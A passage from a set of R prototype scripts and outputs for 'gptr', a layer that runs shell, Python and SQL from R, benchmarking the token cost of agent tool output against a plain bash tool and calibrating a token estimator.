ok   got 0 want 0 | n = length(gptr$sh("git ls-files")$stdout); if (n > 100) gptr$ | [read: git ls-files; read: git status]

46 / 46 expectations met
classification cost: 3.76 ms per call
````

### `p09_history.R`

````r
# G5 prototype 9: how helper calls are recorded in the runnable history document.
# Each bridge call emits a nested-call event; the history writer turns events into "#>" digests
# (report 14 block grammar). In .Rmd/.qmd a single literal helper call becomes a native chunk.
Sys.setenv(RETICULATE_PYTHON = "/opt/homebrew/bin/python3")
.libPaths(c("/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/rlib", .libPaths()))
source("g5_helpers.R"); source("g5_classify.R")

G5$events = list()
record_line = function(x) UseMethod("record_line")
record_line.gptr_cmd = function(x) {
  n = length(x$stdout)
  sprintf("sh %s: %s, %d line%s%s", substr(gsub("\\s+", " ", .subset2(x, "cmd")), 1, 50),
          if (isTRUE(.subset2(x, "timed_out"))) "timed out" else paste("exit", .subset2(x, "status")),
          n, if (n == 1) "" else "s", if (length(x$stderr)) sprintf(", %d stderr", length(x$stderr)) else "")
}
record_line.gptr_py = function(x) {
  if (!is.null(.subset2(x, "error"))) return(paste("py error:", strsplit(.subset2(x, "error"), "\n")[[1]][1]))
  k = .subset2(x, "kind")
  if (is.null(k) || !nzchar(k)) "py: ok (no value)" else paste("py:", k)
}
record_line.gptr_sql = function(x) sprintf("sql: %s rows x %d cols", format(nrow(x), big.mark = ","), ncol(x))
record_line.gptr_job = function(x) sprintf("bg %s started: %s", x$id, x$cmd)
record_line.default = function(x) sprintf("%s: %s", class(x)[1], "done")

# wrap every registered bridge so it emits an event (this is what the harness hook layer does)
for (nm in c("sh", "script", "bg", "py", "sql")) local({
  b = G5$bridges[[nm]]; f = b$fun; name = nm
  G5$bridges[[name]]$fun = function(...) {
    t0 = proc.time()[["elapsed"]]
    val = f(...)
    G5$events[[length(G5$events) + 1L]] = list(bridge = name, seconds = round(proc.time()[["elapsed"]] - t0, 2),
                                             record = record_line(val))
    val
  }
})

agent_code = paste(
  'st = gptr$sh("git -C bench/repo status --porcelain")$stdout',
  'table(substr(st, 1, 2))',
  "tab = gptr$py(\"sales.groupby('region').revenue.sum().round(0)\", sales = sales)",
  'top = gptr$sql("SELECT region, COUNT(*) n FROM orders GROUP BY region ORDER BY n DESC", orders = orders)',
  sep = "\n")
set.seed(7)
sales = data.frame(region = sample(c("north", "south"), 100, TRUE), revenue = round(runif(100) * 100, 2))
orders = data.frame(region = sample(c("north", "south", "east"), 1000, TRUE))
out = capture.output(for (e in parse(text = agent_code)) { v = withVisible(eval(e)); if (v$visible) print(v$value) })

id = substr(as.character(openssl::sha256(agent_code)), 1, 6)    # ids from a hash, never the RNG
block = c(sprintf("# >>> gptr:%s model=anthropic/claude-sonnet-5-5 risk=%d", id,
                  max(gptr_classify_bridges(agent_code)$level)),
          strsplit(agent_code, "\n")[[1]],
          paste("#>", vapply(G5$events, `[[`, "", "record")),
          sprintf("# <<< gptr:%s", id))
cat("=== .R history block ===\n"); writeLines(block)

native_chunk = function(code) {
  e = parse(text = code, keep.source = FALSE)
  if (length(e) != 1L || !is.call(e[[1]])) return(NULL)
  cl = e[[1]]; b = bridge_name(cl[[1]])
  if (is.null(b)) return(NULL)
  lit = function(i) { a = as.list(cl)[-1][[i]]; if (is.character(a) && length(a) == 1L) a else NULL }
  switch(b,
    sh = if (!is.null(lit(1))) c("```{bash}", lit(1), "```"),
    py = if (length(cl) == 2L && !is.null(lit(1))) c("```{python}", lit(1), "```"),
    sql = if (!is.null(lit(1)) && !is.null(cl$con) && is.symbol(cl$con))
      c(sprintf("```{sql, connection=%s}", as.character(cl$con)), lit(1), "```"),
    knit = if (!is.null(lit(1)) && !is.null(lit(2))) c(sprintf("```{%s}", lit(1)), lit(2), "```"),
    NULL)
}
cat("\n=== .Rmd: single literal helper calls become native chunks ===\n")
for (code in c('gptr$sh("quarto render report.qmd")',
               "gptr$py(\"import pandas as pd\\nsales = pd.read_csv('sales.csv')\")",
               'gptr$sql("SELECT region, COUNT(*) n FROM orders GROUP BY region", con = shop)',
               'gptr$knit("perl", "print 6 * 7")',
               'x = gptr$sh("make")')) {
  ch = native_chunk(code)
  cat(sprintf("%-78s -> %s\n", code, if (is.null(ch)) "stays in the R chunk gptr-<id>" else paste(ch, collapse = " | ")))
}
````

### `p09_history.out`

````text
=== .R history block ===
# >>> gptr:deb83d model=anthropic/claude-sonnet-5-5 risk=2
st = gptr$sh("git -C bench/repo status --porcelain")$stdout
table(substr(st, 1, 2))
tab = gptr$py("sales.groupby('region').revenue.sum().round(0)", sales = sales)
top = gptr$sql("SELECT region, COUNT(*) n FROM orders GROUP BY region ORDER BY n DESC", orders = orders)
#> sh git -C bench/repo status --porcelain: exit 0, 6 lines
#> py: Series 2
#> sql: 3 rows x 2 cols
# <<< gptr:deb83d

=== .Rmd: single literal helper calls become native chunks ===
gptr$sh("quarto render report.qmd")                                            -> ```{bash} | quarto render report.qmd | ```
gptr$py("import pandas as pd\nsales = pd.read_csv('sales.csv')")               -> ```{python} | import pandas as pd
sales = pd.read_csv('sales.csv') | ```
gptr$sql("SELECT region, COUNT(*) n FROM orders GROUP BY region", con = shop)  -> ```{sql, connection=shop} | SELECT region, COUNT(*) n FROM orders GROUP BY region | ```
gptr$knit("perl", "print 6 * 7")                                               -> ```{perl} | print 6 * 7 | ```
x = gptr$sh("make")                                                            -> stays in the R chunk gptr-<id>
````

### `p10_tokens.R`

````r
# G5 prototype 10: token cost of polyglot work through gptr helpers versus a bash tool.
# Every transcript below is produced by actually running the commands on this machine.
#   A  = bash tool with Pi semantics (bash -c, stdout+stderr merged, tail truncation to
#        2000 lines / 50 KB with Pi's notice, "Command exited with code N").
#   A2 = the same bash tool, used frugally (pipes to head/tail/sort), where natural.
#   B  = the r tool calling the same command through gptr$sh (gptr's print budget).
#   C  = the r tool composing helpers with R (compute, then print only what is needed).
# Counted: tool-call arguments as wire JSON + tool-result text, o200k_base (rtiktoken).
RLIB = "/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/rlib"
PI = "/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/pi"
.libPaths(c(RLIB, .libPaths()))
Sys.setenv(RETICULATE_PYTHON = "/opt/homebrew/bin/python3")
source("g5_helpers.R")
HERE = getwd()
tok = function(x) rtiktoken::get_token_count(paste(x, collapse = "\n"), "o200k_base")
json = function(x) as.character(jsonlite::toJSON(x, auto_unbox = TRUE))

# ------------------------------------------------------------------ fixtures
B = file.path(HERE, "bench"); unlink(B, recursive = TRUE); dir.create(B)
repo = file.path(B, "repo"); dir.create(repo)
file.copy(list.files(file.path(PI, "packages/coding-agent/src/core/tools"), "\\.ts$", full.names = TRUE), repo)
genv = c("current", GIT_AUTHOR_NAME = "g5", GIT_AUTHOR_EMAIL = "g5@example.org",
         GIT_COMMITTER_NAME = "g5", GIT_COMMITTER_EMAIL = "g5@example.org")
git = function(...) invisible(processx::run("git", c("-C", repo, ...), env = genv))
git("init", "-q"); git("add", "."); git("commit", "-q", "-m", "init")
edit_file = function(f, n) {
  x = readLines(f); i = round(seq(5, length(x) - 5, length.out = n))
  x[i] = paste0(x[i], " // reviewed"); writeLines(x, f)
}
edit_file(file.path(repo, "bash.ts"), 12); edit_file(file.path(repo, "edit.ts"), 8); edit_file(file.path(repo, "grep.ts"), 6)
writeLines("export const x = 1;", file.path(repo, "new-tool.ts")); writeLines("notes", file.path(repo, "NOTES.md"))
invisible(file.remove(file.path(repo, "ls.ts")))

writeLines(c("#!/bin/sh", "echo '== configure'",
  "i=1; while [ $i -le 400 ]; do echo \"[step $i/400] processing chunk_$i.parquet ... ok ($((i*3)) rows/s)\"; i=$((i+1)); done",
  "echo 'WARNING: 3 chunks had missing timestamps' 1>&2",
  "echo '== done: 400 chunks, 1,203,300 rows, output in out/'"), file.path(B, "build.sh"))

set.seed(7)
sales = data.frame(region = sample(c("north", "south", "east", "west"), 5000, TRUE),
                   month = sample(1:12, 5000, TRUE), revenue = round(rexp(5000, 1 / 100), 2))
utils::write.csv(sales, file.path(B, "sales.csv"), row.names = FALSE)

orders = data.frame(id = 1:20000, region = sample(c("north", "south", "east", "west"), 20000, TRUE),
                    customer = sprintf("C%05d", sample(1:3000, 20000, TRUE)), amount = round(rlnorm(20000, 4, 1), 2))
shop_db = file.path(B, "shop.sqlite")
local({ con = DBI::dbConnect(RSQLite::SQLite(), shop_db); DBI::dbWriteTable(con, "orders", orders); DBI::dbDisconnect(con) })

writeLines(c("all:",
  "\t@for i in $$(seq 1 300); do echo \"cc -O2 -Wall -Iinclude -c src/module_$$i.c -o build/module_$$i.o\"; done",
  "\t@echo \"src/module_17.c:42:9: warning: unused variable 'tmp' [-Wunused-variable]\" 1>&2",
  "\t@echo \"src/module_211.c:88:3: warning: implicit conversion loses precision [-Wshorten-64-to-32]\" 1>&2",
  "\t@echo \"ld -o build/app build/*.o\"",
  "\t@echo \"built build/app (300 objects)\""), file.path(B, "Makefile"))

writeLines(c("import time",
  "for i in range(1, 241):",
  "    print(f'[{i:3d}/240] epoch {i // 20 + 1} batch {i % 20:2d} loss={2.0 / (1 + i / 40):.4f} lr=3e-4', flush=True)",
  "    time.sleep(0.025)",
  "print('DONE best_loss=0.2857 checkpoint=ckpt/best.pt', flush=True)"), file.path(B, "long.py"))
URL = "https://raw.githubusercontent.com/tidyverse/ggplot2/main/data-raw/mpg.csv"

# ------------------------------------------------------------------ the two tools
pi_bash = function(command, wd) {                         # Pi bash semantics (report 01, section 3.5)
  f = tempfile("pi-bash-", fileext = ".log")
  r = processx::run("/bin/bash", c("-c", command), wd = wd, stdout = f, stderr = "2>&1",
                    error_on_status = FALSE, env = c("current", PI_BENCH = "1"))
  txt = decode_bytes(readBin(f, "raw", file.size(f)))
  lines = strsplit(sub("\n$", "", txt), "\n", fixed = TRUE)[[1]]
  out = txt
  total = length(lines)
  if (total > 2000 || nchar(txt, "bytes") > 51200) {       # tail truncation, whole lines
    keep = character(); bytes = 0
    for (l in rev(lines)) { b = nchar(l, "bytes") + 1; if (length(keep) >= 2000 || bytes + b > 51200) break; keep = c(l, keep); bytes = bytes + b }
    s = total - length(keep) + 1
    out = sprintf("%s\n\n[Showing lines %d-%d of %d%s. Full output: /tmp/pi-bash-0123456789abcdef.log]",
                  paste(keep, collapse = "\n"), s, total, total, if (length(keep) < 2000) " (50.0KB limit)" else "")
  } else out = sub("\n$", "", out)
  if (!nzchar(out)) out = "(no output)"
  if (!identical(r$status, 0L)) out = paste0(out, "\n\nCommand exited with code ", r$status)
  list(args = json(list(command = command)), result = out)
}
r_tool = function(code, wd, envir) {                       # minimal r tool: evaluate, capture printed output
  old = setwd(wd); on.exit(setwd(old))
  f = tempfile(); con = file(f, "wb"); sink(con)
  ok = tryCatch({ for (e in parse(text = code, keep.source = FALSE)) {
      v = withVisible(eval(e, envir)); if (v$visible) print(v$value) }; TRUE },
    error = function(e) { cat("Error:", conditionMessage(e), "\n"); FALSE })
  sink(); close(con)
  out = sub("\n+$", "", decode_bytes(readBin(f, "raw", file.size(f))))
  list(args = json(list(code = code)), result = if (nzchar(out)) out else "(no output)")
}

E = new.env(parent = globalenv())                          # the user's workspace for the r tool
E$sales = sales
E$shop = DBI::dbConnect(RSQLite::SQLite(), shop_db)

tasks = list(
  T1_git = list(wd = repo,
    A = list("git status && git diff"),
    A2 = list("git status --short && git diff --stat"),
    B = list('gptr$sh("git status && git diff")'),
    C = list(paste('st = gptr$sh("git status --porcelain")$stdout', 'table(substr(st, 1, 2))',
                   'gptr$sh("git diff --numstat")', 'gptr$sh("git diff -U1", max_tokens = 1000)', sep = "\n"))),
  T2_script = list(wd = B,
    A = list("sh build.sh"),
    B = list('gptr$script("build.sh")'),
    C = list(paste('b = gptr$script("build.sh")', 'b$stderr', 'tail(b$stdout, 2)', 'length(b$stdout)', sep = "\n"))),
  T3_rg = list(wd = PI,
    A = list("rg -n signal packages/coding-agent/src"),
    A2 = list("rg -c signal packages/coding-agent/src | sort -t: -k2 -nr | head -8"),
    B = list('gptr$sh("rg -n signal packages/coding-agent/src")'),
    C = list(paste('m = gptr$sh(c("rg", "-n", "signal", "packages/coding-agent/src"))$stdout',
                   'hits = table(sub(":.*", "", m))', 'length(m); head(sort(hits, decreasing = TRUE), 8)', sep = "\n"))),
  T4_python = list(wd = B,
    A = list("python3 - <<'EOF'\nimport pandas as pd\nsales = pd.read_csv('sales.csv')\nprint(sales.groupby(['region','month']).revenue.sum().unstack().round(0))\nEOF"),
    B = list("gptr$py(\"import pandas as pd\\nsales = pd.read_csv('sales.csv')\\nsales.groupby(['region','month']).revenue.sum().unstack().round(0)\")"),
    C = list(paste("tab = gptr$py(\"sales.groupby(['region','month']).revenue.sum().unstack().round(0)\", sales = sales)$value",
                   "range(as.matrix(tab))", sep = "\n"))),
  T5_sql = list(wd = B,
    A = list("sqlite3 -header -column shop.sqlite '.schema orders' 'SELECT * FROM orders LIMIT 5'",
             "sqlite3 -header -column shop.sqlite 'SELECT * FROM orders WHERE amount > 400'",
             "sqlite3 -header -column shop.sqlite 'SELECT region, COUNT(*) n, ROUND(AVG(amount),2) avg FROM orders GROUP BY region ORDER BY n DESC'"),
    B = list('gptr$sql("SELECT * FROM orders LIMIT 5")',
             'gptr$sql("SELECT * FROM orders WHERE amount > 400")',
             'gptr$sql("SELECT region, COUNT(*) n, ROUND(AVG(amount),2) avg FROM orders GROUP BY region ORDER BY n DESC")'),
    C = list(paste('big = gptr$sql("SELECT * FROM orders WHERE amount > 400")', 'dim(big); summary(big$amount)',
                   'gptr$sql("SELECT region, COUNT(*) n, ROUND(AVG(amount),2) avg FROM orders GROUP BY region ORDER BY n DESC")', sep = "\n"))),
  T6_download = list(wd = B,
    A = list(sprintf("curl -sSL -o mpg.csv %s && head -5 mpg.csv && wc -l mpg.csv", URL)),
    B = list(sprintf('gptr$sh("curl -sSL -o mpg.csv %s && head -5 mpg.csv && wc -l mpg.csv")', URL)),
    C = list(paste(sprintf('mpg = read.csv("%s")', URL), 'dim(mpg); head(mpg, 3)', sep = "\n"))),
  T7_make = list(wd = B,
    A = list("make"),
    A2 = list("make 2>&1 | tail -5"),
    B = list('gptr$sh("make")'),
    C = list(paste('b = gptr$sh("make")', 'b$status; b$stderr; tail(b$stdout, 2)', sep = "\n"))),
  T8_long = list(wd = B,
    A = list("python3 long.py"),
    A2 = list("nohup python3 long.py > long.log 2>&1 & echo started $!", "sleep 3; tail -n 3 long.log", "sleep 4; tail -n 3 long.log"),
    B = list('gptr$sh("python3 long.py")'),
    C = list(paste('j = gptr$bg("python3 long.py")', 'j$wait(timeout = 60, until = "DONE", max_tokens = 150)', sep = "\n")))
)

rows = list(); transcripts = list()
for (tn in names(tasks)) {
  t = tasks[[tn]]
  for (v in intersect(c("A", "A2", "B", "C"), names(t))) {
    calls = lapply(t[[v]], function(x) if (v %in% c("A", "A2")) pi_bash(x, t$wd) else r_tool(x, t$wd, E))
    a_tok = sum(vapply(calls, function(k) tok(k$args), 1)); r_tok = sum(vapply(calls, function(k) tok(k$result), 1))
    r_chr = sum(vapply(calls, function(k) nchar(k$result, "bytes"), 1))
    rows[[length(rows) + 1L]] = data.frame(task = tn, variant = v, calls = length(calls), call_tok = a_tok,
                                           result_tok = r_tok, total = a_tok + r_tok, result_bytes = r_chr,
                                           bytes_per_tok = round(r_chr / max(r_tok, 1), 2))
    transcripts[[paste(tn, v)]] = calls
  }
}
res = do.call(rbind, rows)
old = options(width = 160); print(res, row.names = FALSE); options(old)
saveRDS(list(res = res, transcripts = transcripts), file.path(HERE, "p10_tokens.rds"))

cat("\n== totals over the 8 tasks (A = every task's plain bash variant) ==\n")
tot = function(v) sum(res$total[res$variant == v])
cat(sprintf("A %d | B %d | C %d tokens ; round trips A %d, B %d, C %d\n", tot("A"), tot("B"), tot("C"),
            sum(res$calls[res$variant == "A"]), sum(res$calls[res$variant == "B"]), sum(res$calls[res$variant == "C"])))
cat("\n== calibration: chars/4 versus o200k_base on the tool results ==\n")
for (v in c("A", "B", "C")) {
  s = res[res$variant == v, ]
  cat(sprintf("%s: bytes %d, tokens %d, bytes/token %.2f, chars/4 estimate error %+.0f%%\n", v, sum(s$result_bytes),
              sum(s$result_tok), sum(s$result_bytes) / sum(s$result_tok), 100 * (sum(s$result_bytes) / 4 - sum(s$result_tok)) / sum(s$result_tok)))
}
DBI::dbDisconnect(E$shop)
g5_jobs(kill = TRUE)
````

### `p10_tokens.out`

````text
 [1] TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE TRUE
[16] TRUE
        task variant calls call_tok result_tok total result_bytes bytes_per_tok
      T1_git       A     1        9       4408  4417        16732          3.80
      T1_git      A2     1       13         76    89          269          3.54
      T1_git       B     1       15       1570  1585         5784          3.68
      T1_git       C     1       62       1066  1128         3861          3.62
   T2_script       A     1        7       8098  8105        25520          3.15
   T2_script       B     1       12       1066  1078         3213          3.01
   T2_script       C     1       34         66   100          196          2.97
       T3_rg       A     1       13      12331 12344        51172          4.15
       T3_rg      A2     1       27        105   132          433          4.12
       T3_rg       B     1       19       1464  1483         6094          4.16
       T3_rg       C     1       61        135   196         1048          7.76
   T4_python       A     1       51        248   299          526          2.12
   T4_python       B     1       45        336   381          689          2.05
   T4_python       C     1       41         10    51           15          1.50
      T5_sql       A     3       86       6390  6476        15100          2.36
      T5_sql       B     3       67        316   383          685          2.17
      T5_sql       C     1       59        116   175          222          1.91
 T6_download       A     1       43        131   174          261          1.99
 T6_download       B     1       49        131   180          261          1.99
 T6_download       C     1       43        126   169          291          2.31
     T7_make       A     1        5       7263  7268        19501          2.68
     T7_make      A2     1       13         87   100          282          3.24
     T7_make       B     1       11       1451  1462         3882          2.68
     T7_make       C     1       29         84   113          263          3.13
     T8_long       A     1        8       6003  6011        11386          1.90
     T8_long      A2     3       52        139   191          294          2.12
     T8_long       B     1       14       1738  1752         3331          1.92
     T8_long       C     1       36        217   253          446          2.06

== totals over the 8 tasks (A = every task's plain bash variant) ==
A 45094 | B 8304 | C 2185 tokens ; round trips A 10, B 10, C 8

== calibration: chars/4 versus o200k_base on the tool results ==
A: bytes 140198, tokens 44872, bytes/token 3.12, chars/4 estimate error -22%
B: bytes 23939, tokens 8072, bytes/token 2.97, chars/4 estimate error -26%
C: bytes 6342, tokens 1820, bytes/token 3.48, chars/4 estimate error -13%
    id   status             cmd
1 job1 exited 0 python3 long.py
````

### `p11_calibrate.R`

````r
# G5 prototype 11: a content-aware token estimator for command output (budgets need it).
RLIB = "/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/rlib"
PI = "/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/pi"
.libPaths(c(RLIB, .libPaths()))
tok = function(x) rtiktoken::get_token_count(x, "o200k_base")
features = function(x) {                     # all counts in bytes
  nonascii = nchar(gsub("[\\x01-\\x7f]", "", x, perl = TRUE), "bytes")
  cbind(alpha = nchar(gsub("[^A-Za-z]", "", x), "bytes"), digit = nchar(gsub("[^0-9]", "", x), "bytes"),
        space = nchar(gsub("[^ \t]", "", x), "bytes"),
        punct = nchar(gsub("[A-Za-z0-9 \t\n]|[^\\x01-\\x7f]", "", x, perl = TRUE), "bytes"),
        nonascii = nonascii, newline = lengths(regmatches(x, gregexpr("\n", x))) + 1)
}
chunks = function(txt, size = 1500) {          # split long texts into ~1.5 KB pieces of whole lines
  l = strsplit(txt, "\n", fixed = TRUE)[[1]]
  g = cumsum(nchar(l, "bytes") + 1) %/% size
  unname(vapply(split(l, g), paste, "", collapse = "\n"))
}
tr = readRDS("p10_tokens.rds")$transcripts
train = unlist(lapply(tr, function(calls) unlist(lapply(calls, function(k) chunks(k$result)))))
# held-out corpus: other kinds of output R agents see
set.seed(11)
held = c(
  chunks(paste(capture.output(print(head(mtcars, 30))), collapse = "\n")),
  chunks(paste(capture.output(str(iris)), collapse = "\n")),
  chunks(paste(capture.output(summary(lm(mpg ~ ., mtcars))), collapse = "\n")),
  chunks(paste(readLines(file.path(PI, "packages/coding-agent/src/core/tools/edit.ts"), warn = FALSE), collapse = "\n")),
  chunks(paste(readLines(file.path(PI, "README.md"), warn = FALSE), collapse = "\n")),
  chunks(as.character(jsonlite::toJSON(head(mtcars, 20), pretty = TRUE))),
  chunks(paste(capture.output(utils::write.csv(head(airquality, 60), stdout())), collapse = "\n")),
  chunks(paste(system2("ls", c("-la", "/usr/bin"), stdout = TRUE)[1:80], collapse = "\n")),
  chunks(paste(system2("git", c("-C", PI, "log", "-n", "40", "--stat"), stdout = TRUE), collapse = "\n")))
held = held[nzchar(held)]
# mixed corpus: every source split 50/50 into fit and test halves
src = c(rep("bench", length(train)), rep("held", length(held)))
allx = c(train, held)
fit_idx = unlist(lapply(split(seq_along(allx), src), function(i) i[seq(1, length(i), by = 2)]))
X = features(allx); y = vapply(allx, tok, 1)
Xf = X[fit_idx, c("alpha", "digit", "space", "punct", "newline")]
fit = stats::lm(y[fit_idx] ~ 0 + Xf)
co = c(pmax(stats::coef(fit), 0), nonascii = 1 / 3)   # ~1 token per 3-byte CJK character (report 21)
names(co) = c("alpha", "digit", "space", "punct", "newline", "nonascii")
cat("fitted tokens per character class:\n"); print(round(co, 3))
est = function(x) { f = features(x); as.vector(f[, names(co)] %*% co) }
eval_set = function(label, x) {
  y = vapply(x, tok, 1); b = nchar(x, "bytes")
  e1 = (b / 4 - y) / y; e2 = (b / 3 - y) / y; e3 = (est(x) - y) / y
  cat(sprintf("%-14s n=%3d tokens=%6d | chars/4 median %+5.1f%% p95|err| %4.1f%% | chars/3 median %+5.1f%% | fitted median %+5.1f%% p95|err| %4.1f%% total %+5.1f%%\n",
              label, length(x), sum(y), 100 * stats::median(e1), 100 * stats::quantile(abs(e1), .95),
              100 * stats::median(e2), 100 * stats::median(e3), 100 * stats::quantile(abs(e3), .95),
              100 * (sum(est(x)) - sum(y)) / sum(y)))
}
test_idx = setdiff(seq_along(allx), fit_idx)
eval_set("fit half", allx[fit_idx])
eval_set("test half", allx[test_idx])
eval_set("test: bench", allx[intersect(test_idx, which(src == "bench"))])
eval_set("test: other", allx[intersect(test_idx, which(src == "held"))])
cjk = paste(rep("\u6570\u636e\u5206\u6790 \u00e9t\u00e9 caf\u00e9", 40), collapse = "\n")
Encoding(cjk) = "UTF-8"
cat(sprintf("non-ASCII probe: o200k %d, fitted %.0f, chars/4 %.0f\n", tok(cjk), est(cjk), nchar(cjk, "bytes") / 4))
cat("\ncoefficients for g5_helpers.R:\n"); dput(round(co, 4))
````

### `p11_calibrate.out`

````text
fitted tokens per character class:
   alpha    digit    space    punct  newline nonascii 
   0.136    0.810    0.094    0.677    1.637    0.333 
fit half       n=126 tokens= 50576 | chars/4 median  -8.1% p95|err| 52.3% | chars/3 median +22.5% | fitted median  +1.3% p95|err| 21.0% total  -0.2%
test half      n=124 tokens= 49266 | chars/4 median  -7.0% p95|err| 50.7% | chars/3 median +24.1% | fitted median  +0.4% p95|err| 22.9% total  -0.7%
test: bench    n= 69 tokens= 26744 | chars/4 median -20.1% p95|err| 51.4% | chars/3 median  +6.6% | fitted median  -0.1% p95|err| 27.1% total  -0.3%
test: other    n= 55 tokens= 22522 | chars/4 median  -4.8% p95|err| 46.8% | chars/3 median +27.0% | fitted median  +0.5% p95|err| 14.9% total  -1.2%
non-ASCII probe: o200k 199, fitted 335, chars/4 250

coefficients for g5_helpers.R:
c(alpha = 0.1355, digit = 0.8104, space = 0.0938, punct = 0.677, 
newline = 1.6367, nonascii = 0.3333)
````

### `p12_declarations.R`

````r
# G5 prototype 12: one-time (cacheable) declaration cost of the helpers vs a bash / shell tool.
.libPaths(c("/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/rlib", .libPaths()))
tok = function(x) rtiktoken::get_token_count(paste(x, collapse = "\n"), "o200k_base")
json = function(x) as.character(jsonlite::toJSON(x, auto_unbox = TRUE))
props = function(...) list(...)

pi_bash = json(list(name = "bash",
  description = paste("Execute a bash command in the current working directory. Returns stdout and stderr.",
    "Output is truncated to last 2000 lines or 50KB (whichever is hit first). If truncated, full output",
    "is saved to a temp file. Optionally provide a timeout in seconds."),
  input_schema = list(type = "object", required = I("command"), properties = props(
    command = list(type = "string", description = "Shell command to execute"),
    timeout = list(type = "number", description = "Timeout in seconds (optional, no default timeout)")))))
pi_snippet = "- bash: Execute bash commands (ls, grep, find, etc.)"

gptr_shell_tool = json(list(name = "shell",
  description = paste("Execute a bash command in the current working directory. Returns stdout and stderr.",
    "Output is truncated to last 2000 lines or 50KB (whichever is hit first). If truncated, full output",
    "is saved to a temp file. Optionally provide a timeout in seconds."),
  input_schema = list(type = "object", required = I("command"), properties = props(
    command = list(type = "string", description = "Shell command to execute"),
    timeout = list(type = "number", description = "Timeout in seconds (optional, no default timeout)")))))

polyglot = c(
  "<polyglot>",
  "Programs, shell commands and other languages run from R through gptr helpers (there is no shell tool; shell here: {shell}).",
  "- gptr$sh(cmd, input=, wd=, timeout=120): cmd is an argv vector c(\"git\",\"diff\") (no shell, portable) or one string (simple commands run directly; pipes and redirects use the shell). Returns $stdout, $stderr (lines), $status; printing shows a head+tail view and the path of the full output.",
  "- gptr$script(path, args): run .sh .py .R .js ... by extension.",
  "- gptr$bg(cmd) -> job; job$read(), job$wait(timeout, until = regex), job$write(text), job$kill(); gptr$jobs().",
  "- gptr$py(code, name = obj): persistent Python (reticulate); the last expression is shown, $value converts it to R.",
  "- gptr$sql(query, con =, name = df): DBI query (data frames via duckdb); prints the first rows, the value holds all rows.",
  "- gptr$knit(engine, code): any other knitr engine (perl, ruby, node, ...).",
  "Assign results (x = gptr$sh(...)) and print only what you need; filter with R (grep, table, head) rather than printing whole outputs.",
  "</polyglot>")
cat(sprintf("Pi bash tool schema (wire JSON):         %4d tokens\n", tok(pi_bash)))
cat(sprintf("Pi bash prompt snippet:                  %4d tokens\n", tok(pi_snippet)))
cat(sprintf("gptr <polyglot> prompt section:          %4d tokens\n", tok(polyglot)))
cat(sprintf("an extra opt-in 'shell' tool (01 schema): %4d tokens\n", tok(gptr_shell_tool)))
writeLines(polyglot, "polyglot_section.txt")
````

### `p12_declarations.out`

````text
Pi bash tool schema (wire JSON):          110 tokens
Pi bash prompt snippet:                    15 tokens
gptr <polyglot> prompt section:           297 tokens
an extra opt-in 'shell' tool (01 schema):  110 tokens
````

### `p13_echo.R`

````r
# G5 prototype 13: echo = TRUE streams child output to the user (R's stderr) while the
# model-facing capture (a sink on stdout, as in the r tool) only receives the budgeted print.
source("g5_helpers.R")
model = tempfile(); con = file(model, "wb"); sink(con)
r = gptr$sh(c("sh", "-c", "for i in $(seq 1 300); do echo progress $i; sleep 0.002; done"), echo = TRUE, max_tokens = 80)
print(r)
sink(); close(con)
m = readLines(model)
cat("model saw", length(m), "lines; first:", m[1], "| notice:", grep("omitted", m, value = TRUE), "\n")
````

### `p13_echo.out`

````text
model saw 21 lines; first: progress 1 | notice: [... 280 lines omitted (300 total, 3.7KB); all: gptr$out(1)$stdout] 
````

### `p14_names.out`

````text
sh("git status")                                              5 tokens
gptr$sh("git status")                                         8 tokens
gptr_sh("git status")                                         7 tokens
tools$sh("git status")                                        7 tokens
gptr::gptr$sh("git status")                                  11 tokens
processx::run("git", "status")$stdout                        12 tokens
system2("git", "status", stdout = TRUE, stderr = TRUE)       16 tokens
gptr$py("df.describe()", df = df)                            12 tokens
gptr_py("df.describe()", df = df)                            11 tokens
gptr$sql("SELECT 1")                                          8 tokens
gptr_sql("SELECT 1")                                          8 tokens
````

### `polyglot_section.txt`

````text
<polyglot>
Programs, shell commands and other languages run from R through gptr helpers (there is no shell tool; shell here: {shell}).
- gptr$sh(cmd, input=, wd=, timeout=120): cmd is an argv vector c("git","diff") (no shell, portable) or one string (simple commands run directly; pipes and redirects use the shell). Returns $stdout, $stderr (lines), $status; printing shows a head+tail view and the path of the full output.
- gptr$script(path, args): run .sh .py .R .js ... by extension.
- gptr$bg(cmd) -> job; job$read(), job$wait(timeout, until = regex), job$write(text), job$kill(); gptr$jobs().
- gptr$py(code, name = obj): persistent Python (reticulate); the last expression is shown, $value converts it to R.
- gptr$sql(query, con =, name = df): DBI query (data frames via duckdb); prints the first rows, the value holds all rows.
- gptr$knit(engine, code): any other knitr engine (perl, ruby, node, ...).
Assign results (x = gptr$sh(...)) and print only what you need; filter with R (grep, table, head) rather than printing whole outputs.
</polyglot>
````

### `processx_process.txt`

````text
External process

Description:

     Managing external processes from R is not trivial, and this class
     aims to help with this deficiency. It is essentially a small
     wrapper around the 'system' base R function, to return the process
     id of the started process, and set its standard output and error
     streams. The process id is then used to manage the process.

Batch files:

     Running Windows batch files ('.bat' or '.cmd' files) may be
     complicated because of the 'cmd.exe' command line parsing rules.
     For example you cannot easily have whitespace in both the command
     (path) and one of the arguments. To work around these limitations
     you need to start a 'cmd.exe' shell explicitly and use its 'call'
     command. For example:

     process$new("cmd.exe", c("/c", "call", bat_file, "arg 1", "arg 2"))
     
     This works even if 'bat_file' contains whitespace characters. For
     more information about this, see this processx issue:
     https://github.com/r-lib/processx/issues/301

     The detailed parsing rules are at
     https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd

     A very good practical guide is at
     https://ss64.com/nt/syntax-esc.html

Polling:

     The 'poll_io()' function polls the standard output and standard
     error connections of a process, with a timeout. If there is output
     in either of them, or they are closed (e.g. because the process
     exits) 'poll_io()' returns immediately.

